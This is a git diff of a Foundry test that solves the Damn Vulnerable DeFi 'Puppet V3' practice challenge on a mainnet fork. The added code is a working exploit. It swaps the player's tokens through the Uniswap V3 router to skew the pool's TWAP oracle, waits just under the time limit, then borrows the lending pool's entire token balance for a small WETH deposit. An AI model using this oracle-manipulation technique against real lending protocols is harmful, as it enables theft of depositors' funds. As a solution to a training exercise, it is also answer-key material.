@@ -11,6 +11,9 @@ import {DamnValuableToken} from "../../src/DamnValuableToken.sol";
 import {INonfungiblePositionManager} from "../../src/puppet-v3/INonfungiblePositionManager.sol";
 import {PuppetV3Pool} from "../../src/puppet-v3/PuppetV3Pool.sol";
 
+// adding
+import {ISwapRouter} from "@uniswap/v3-periphery/contracts/interfaces/ISwapRouter.sol";
+
 contract PuppetV3Challenge is Test {
     address deployer = makeAddr("deployer");
     address player = makeAddr("player");
@@ -24,6 +27,7 @@ contract PuppetV3Challenge is Test {
     uint24 constant FEE = 3000;
 
     IUniswapV3Factory uniswapFactory = IUniswapV3Factory(0x1F98431c8aD98523631AE4a59f267346ea31F984);
+    // V3相关合约 NonfungiblePositionManager
     INonfungiblePositionManager positionManager =
         INonfungiblePositionManager(payable(0xC36442b4a4522E871399CD717aBDD847Ab11FE88));
     WETH weth = WETH(payable(0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2));
@@ -44,6 +48,7 @@ contract PuppetV3Challenge is Test {
      */
     function setUp() public {
         // Fork from mainnet state at specific block
+        // 
         vm.createSelectFork((vm.envString("MAINNET_FORKING_URL")), 15450164);
 
         startHoax(deployer);
@@ -61,13 +66,14 @@ contract PuppetV3Challenge is Test {
         bool isWethFirst = address(weth) < address(token);
         address token0 = isWethFirst ? address(weth) : address(token);
         address token1 = isWethFirst ? address(token) : address(weth);
+        // ??
         positionManager.createAndInitializePoolIfNecessary({
             token0: token0,
             token1: token1,
             fee: FEE,
             sqrtPriceX96: _encodePriceSqrt(1, 1)
         });
-
+        // ??
         IUniswapV3Pool uniswapPool = IUniswapV3Pool(uniswapFactory.getPool(address(weth), address(token), FEE));
         uniswapPool.increaseObservationCardinalityNext(40);
 
@@ -119,13 +125,42 @@ contract PuppetV3Challenge is Test {
      * CODE YOUR SOLUTION HERE
      */
     function test_puppetV3() public checkSolvedByPlayer {
-        
+        // ??
+
+        // uniswapV3 Routwer地址
+        address uniswapRouterAddress = 0xE592427A0AEce92De3Edee1F18E0157C05861564;
+        // 可以approve任意数量
+        token.approve(address(uniswapRouterAddress), type(uint256).max);
+        uint256 quote1 = lendingPool.calculateDepositOfWETHRequired(LENDING_POOL_INITIAL_TOKEN_BALANCE);
+        console.log("beofre quote: %e", quote1); //quote:3000000000000000000000000  3e24
+
+        // ??
+        // UniswapV3交易接口
+        ISwapRouter(uniswapRouterAddress).exactInputSingle(
+            ISwapRouter.ExactInputSingleParams(
+                address(token),
+                address(weth),
+                3000,
+                address(player),
+                block.timestamp,
+                PLAYER_INITIAL_TOKEN_BALANCE, // 110 DVT TOKENS
+                0,
+                0
+            )
+        );  
+        vm.warp(block.timestamp + 114);
+        uint256 quote = lendingPool.calculateDepositOfWETHRequired(LENDING_POOL_INITIAL_TOKEN_BALANCE);
+        weth.approve(address(lendingPool), quote);
+        console.log("quote: %e", quote); //  1.4e17
+        lendingPool.borrow(LENDING_POOL_INITIAL_TOKEN_BALANCE);
+        token.transfer(recovery, LENDING_POOL_INITIAL_TOKEN_BALANCE);
     }
 
     /**
      * CHECKS SUCCESS CONDITIONS - DO NOT TOUCH
      */
     function _isSolved() private view {
+        // ?? 115
         assertLt(block.timestamp - initialBlockTimestamp, 115, "Too much time passed");
         assertEq(token.balanceOf(address(lendingPool)), 0, "Lending pool still has tokens");
         assertEq(token.balanceOf(recovery), LENDING_POOL_INITIAL_TOKEN_BALANCE, "Not enough tokens in recovery account");
